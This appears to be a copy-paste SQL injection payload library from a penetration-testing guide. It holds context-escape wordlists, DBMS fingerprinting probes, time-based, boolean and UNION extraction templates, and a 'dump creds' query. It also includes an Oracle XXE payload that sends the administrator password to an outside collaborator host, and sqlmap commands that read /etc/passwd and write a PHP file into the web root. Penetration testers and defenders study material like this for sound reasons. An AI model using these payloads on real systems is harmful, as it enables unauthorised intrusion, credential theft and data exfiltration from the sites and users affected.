# Copy-paste SQLi payload library — Open WHEN: a parameter errors/shifts on a `'` and you need to confirm context, fingerprint the DBMS, or build a UNION/error/boolean/time template

The body covers detection-channel theory and DBMS primitive names. This file is the
ready-to-paste string library: context-escape wordlist, fingerprint payloads with
expected errors, and full extraction templates per DBMS. Paste, send, diff.

## 1. Context-confirmation wordlist (escape the literal)

Send each as the whole parameter value; a true-vs-false content shift confirms injection
and reveals the quoting context (none / `'` / `"` / `` ` ``) and bracket nesting.

```
[empty]   '   "   `   ')   ")   `)   '))   "))   `))
```

TRUE-condition variants (each should render the same as the unmodified TRUE page):

```
1            1>0          2-1          0+1          1*1          1%2
1 & 1        1&&2         -1 || 1      -1 oR 1=1    1 aND 1=1    (1)oR(1=1)
-1/**/oR/**/1=1           1/**/aND/**/1=1
1'           1'>'0        2'-'1        0'+'1        1'*'1        1'&'1'='1
-1'||'1'='1  -1'oR'1'='1  1'aND'1'='1
1"           2"-"1        1"&"1"="1    -1"oR"1"="1  1"aND"1"="1
1`           2`-`1        -1`oR`1`=`1  1`aND`1`=`1
1')>('0      2')-('1      -1')oR'1'=('1            1')aND'1'=('1
1")>("0      -1")oR"1"=("1                         1")aND"1"=("1
1`)aND`1`=(`1            -1`)oR`1`=(`1
```

Merging/concat probes (string contexts that concatenate adjacent literals):

```
`+HERP    '||'DERP    '+'herp    ' 'DERP    '%20'HERP    '%2B'HERP
```

Math probe (no quote needed): `?id=2-1` returns the same row as `?id=1` ⇒ numeric injection.

## 2. Comment terminators (by DBMS)

```
MySQL       #     -- (note trailing space)     /*comment*/     /*! version-gated */
PostgreSQL  --comment    /*comment*/
MSSQL       --comment    /*comment*/
Oracle      --comment           (no /* */ inline-comment terminator on injected tail)
SQLite      --comment    /*comment*/
HQL         no comment support — close the clause instead
```

## 3. DBMS fingerprint by keyword (true ⇒ that DBMS)

Append as `AND <payload>`; the payload is true ONLY on the matching engine.

```
MySQL        conv('a',16,2)=conv('a',16,2)    connection_id()=connection_id()    crc32('MySQL')=crc32('MySQL')
MSSQL        BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)   @@CONNECTIONS>0   @@CPU_BUSY=@@CPU_BUSY   USER_ID(1)=USER_ID(1)
Oracle       ROWNUM=ROWNUM    RAWTOHEX('AB')=RAWTOHEX('AB')    LNNVL(0=123)
PostgreSQL   5::int=5    pg_client_encoding()=pg_client_encoding()    get_current_ts_config()=get_current_ts_config()    quote_literal(42.5)=quote_literal(42.5)
SQLite       sqlite_version()=sqlite_version()    last_insert_rowid()>1
MSAccess     val(cvar(1))=1    IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0    cdbl(1)=cdbl(1)
ANY (sanity) 1337=1337    'i'='i'
```

## 4. DBMS fingerprint by error string (send a bare `'`)

| Error text fragment in response | DBMS | Trigger |
|---|---|---|
| `You have an error in your SQL syntax; ... near '' at line 1` | MySQL/MariaDB | `'` |
| `unterminated quoted string at or near "'"` | PostgreSQL | `'` |
| `syntax error at or near "1"` | PostgreSQL | `1'` |
| `Unclosed quotation mark after the character string` | MSSQL | `'` |
| `conversion of the varchar value to data type int ... out-of-range` | MSSQL | `1'` |
| `ORA-00933: SQL command not properly ended` | Oracle | `'` |
| `ORA-01756: quoted string not properly terminated` | Oracle | `'` |
| `ORA-00923: FROM keyword not found where expected` | Oracle | `1'` |

## 5. Time-based confirm (string + logical-op variants the body omits)

```
MySQL        1' + sleep(10)        1' && sleep(10)        1' | sleep(10)
PostgreSQL   1' || pg_sleep(10)
MSSQL        1' WAITFOR DELAY '0:0:10'
Oracle       1' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)
SQLite       1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
heavy-query  BENCHMARK(2000000,MD5(NOW()))           (when SLEEP is blocked)
```

## 6. UNION extraction templates (MySQL `information_schema`)

Column count first (`ORDER BY n` / `UNION SELECT NULL,...` is in the body). Then:

```sql
-- database names
-1' UniOn Select 1,2,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata-- -
-- tables of current db
-1' UniOn Select 1,2,3,group_concat(0x7c,table_name,0x7c) fRoM information_schema.tables wHeRe table_schema=database()-- -
-- columns of a table
-1' UniOn Select 1,2,3,group_concat(0x7c,column_name,0x7c) fRoM information_schema.columns wHeRe table_name=0x7573657273-- -
-- dump creds
-1' UNION SELECT 1,username,password FROM users-- -
```

PostgreSQL leak `version()` via numeric-cast error (no output channel needed):

```sql
LIMIT CAST((SELECT version()) as numeric)
-- ERROR: invalid input syntax for type numeric: "PostgreSQL 9.5.25 on x86_64..."
```

## 7. Error-based one-liners (data in the error text)

```sql
-- MySQL double-query / floor(rand) (leaks @@VERSION; swap subquery for any scalar)
' AND (select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))-- -
-- Oracle OOB-via-XXE error exfil (leaks admin password to your collaborator host)
a' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.OAST-HOST/"> %remote;]>'),'/l') FROM dual-- -
```

## 8. Boolean bit-extraction template (length then chars, binary search)

```
?id=1 AND LENGTH(@@hostname)=N--                          (sweep N to learn length)
?id=1 AND ASCII(SUBSTRING(@@hostname,1,1))>64--           (binary-search the byte)
?id=1 AND ASCII(SUBSTRING(@@hostname,1,1))=104--          (confirm exact char)
```

Error-as-oracle variants (response flips between OK and a SQL error per guessed bit):

```sql
-- MySQL: force error on TRUE branch
AND (SELECT IF(1,(SELECT table_name FROM information_schema.tables),'a'))-- -
-- SQLite: malformed-JSON error on FALSE branch
' AND CASE WHEN 1=1 THEN 1 ELSE json('') END AND 'A'='A
```

## 9. Time-based bit-extraction template (gate the sleep on the predicate)

```sql
-- MySQL
1 and (select sleep(5) from users where SUBSTR(table_name,1,1)='A')#
-- generic IF-gated heavy query
1 AND IF(SUBSTRING(VERSION(),1,1)='5', BENCHMARK(1000000,MD5(1)), 0)-- -
```

## 10. sqlmap / ghauri flags the body does not list

```bash
# read/write files once FILE priv confirmed
sqlmap -u "URL?id=1" --file-read=/etc/passwd --batch
sqlmap -u "URL?id=1" --file-write=local.php --file-dest=/var/www/html/s.php --batch
# stack tampers for layered WAFs + force technique to skip noise
sqlmap -u "URL?id=1" --tamper=space2comment,charencode --technique=BEU --batch
# second-order: inject at A, evaluate at B
sqlmap -u "URL/register" --data="user=x&mail=y" --second-url="URL/profile" --batch
# ghauri often faster on time-based blind
ghauri -u "URL?id=1" --dbs --technique=T
```
